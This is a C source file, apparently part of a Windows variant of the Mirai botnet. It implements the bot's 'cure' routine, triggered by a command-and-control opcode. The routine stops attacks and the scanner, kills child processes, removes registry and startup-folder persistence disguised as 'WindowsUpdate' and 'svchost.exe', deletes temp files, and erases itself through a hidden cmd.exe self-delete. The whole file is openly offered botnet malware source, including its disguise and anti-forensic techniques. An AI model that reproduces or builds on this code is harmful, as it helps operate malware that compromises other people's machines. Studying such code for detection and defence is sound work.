// Windows bot cure/removal functionality
// Handles self-destruct and cleanup commands from C&C

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlobj.h>

#include "includes.h"

#ifdef DEBUG
#include <stdio.h>
#endif

// Cure command opcode
#define CURE_OPCODE 0xFE

// Function to delete the bot executable
static void delete_self(void)
{
  char szModuleName[MAX_PATH];
  char szCmd[2 * MAX_PATH];
  STARTUPINFOA si = {0};
  PROCESS_INFORMATION pi = {0};

  // Get our executable path
  GetModuleFileNameA(NULL, szModuleName, MAX_PATH);

#ifdef DEBUG
  printf("[cure] Preparing to delete: %s\n", szModuleName);
#endif

  // Create a batch file to delete ourselves
  sprintf(szCmd, "cmd.exe /C ping 127.0.0.1 -n 2 > nul & del /F /Q \"%s\"", szModuleName);

  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;

  // Launch the self-delete batch
  if (CreateProcessA(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
  {
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
#ifdef DEBUG
    printf("[cure] Self-delete scheduled\n");
#endif
  }
}

// Remove persistence mechanisms
static void remove_persistence(void)
{
  HKEY hKey;

  // Remove from Run registry key
  if (RegOpenKeyExA(HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0,
                    KEY_SET_VALUE,
                    &hKey) == ERROR_SUCCESS)
  {
    RegDeleteValueA(hKey, "MiraiBot");
    RegDeleteValueA(hKey, "WindowsUpdate");
    RegDeleteValueA(hKey, "SecurityUpdate");
    RegCloseKey(hKey);
  }

  // Remove from startup folder
  char startupPath[MAX_PATH];
  if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath) == S_OK)
  {
    char exePath[MAX_PATH];
    sprintf(exePath, "%s\\svchost.exe", startupPath);
    DeleteFileA(exePath);

    sprintf(exePath, "%s\\update.exe", startupPath);
    DeleteFileA(exePath);
  }

#ifdef DEBUG
  printf("[cure] Persistence removed\n");
#endif
}

// Kill all child processes
static void kill_child_processes(void)
{
  HANDLE hSnap;
  PROCESSENTRY32 pe32;
  DWORD myPid = GetCurrentProcessId();

  hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnap == INVALID_HANDLE_VALUE)
    return;

  pe32.dwSize = sizeof(PROCESSENTRY32);

  if (Process32First(hSnap, &pe32))
  {
    do
    {
      // Check if this is a child process (basic check by comparing exe names)
      if (pe32.th32ParentProcessID == myPid)
      {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
        if (hProcess != NULL)
        {
          TerminateProcess(hProcess, 1);
          CloseHandle(hProcess);
#ifdef DEBUG
          printf("[cure] Killed child process: %d\n", pe32.th32ProcessID);
#endif
        }
      }
    } while (Process32Next(hSnap, &pe32));
  }

  CloseHandle(hSnap);
}

// Clean up temporary files
static void cleanup_temp_files(void)
{
  char tempPath[MAX_PATH];
  char filePath[MAX_PATH];

  // Get temp directory
  if (GetTempPathA(MAX_PATH, tempPath) > 0)
  {
    // Delete common temp file patterns
    sprintf(filePath, "%s\\mirai_*", tempPath);

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(filePath, &findData);

    if (hFind != INVALID_HANDLE_VALUE)
    {
      do
      {
        sprintf(filePath, "%s\\%s", tempPath, findData.cFileName);
        DeleteFileA(filePath);
#ifdef DEBUG
        printf("[cure] Deleted temp file: %s\n", filePath);
#endif
      } while (FindNextFileA(hFind, &findData));

      FindClose(hFind);
    }
  }
}

// Main cure function - called when cure command received
void execute_cure(void)
{
#ifdef DEBUG
  printf("[cure] ========================================\n");
  printf("[cure] EXECUTING BOT CURE/REMOVAL SEQUENCE\n");
  printf("[cure] ========================================\n");
#endif

  // Step 1: Stop all attacks
#ifdef DEBUG
  printf("[cure] Step 1: Stopping all attacks...\n");
#endif
  attack_kill_all();

  // Step 2: Kill scanner
#ifdef DEBUG
  printf("[cure] Step 2: Stopping scanner...\n");
#endif
  scanner_kill();

  // Step 3: Kill any child processes
#ifdef DEBUG
  printf("[cure] Step 3: Terminating child processes...\n");
#endif
  kill_child_processes();

  // Step 4: Remove persistence
#ifdef DEBUG
  printf("[cure] Step 4: Removing persistence mechanisms...\n");
#endif
  remove_persistence();

  // Step 5: Clean up temp files
#ifdef DEBUG
  printf("[cure] Step 5: Cleaning temporary files...\n");
#endif
  cleanup_temp_files();

  // Step 6: Delete self
#ifdef DEBUG
  printf("[cure] Step 6: Scheduling self-deletion...\n");
  printf("[cure] ========================================\n");
  printf("[cure] CURE COMPLETE - BOT WILL NOW EXIT\n");
  printf("[cure] ========================================\n");
#endif

  delete_self();

  // Exit immediately
  ExitProcess(0);
}

// Check if command is a cure command
BOOL is_cure_command(unsigned char *buf, int len)
{
  if (len >= 4 && buf[0] == CURE_OPCODE)
  {
#ifdef DEBUG
    printf("[cure] Cure command detected!\n");
#endif
    return TRUE;
  }
  return FALSE;
}
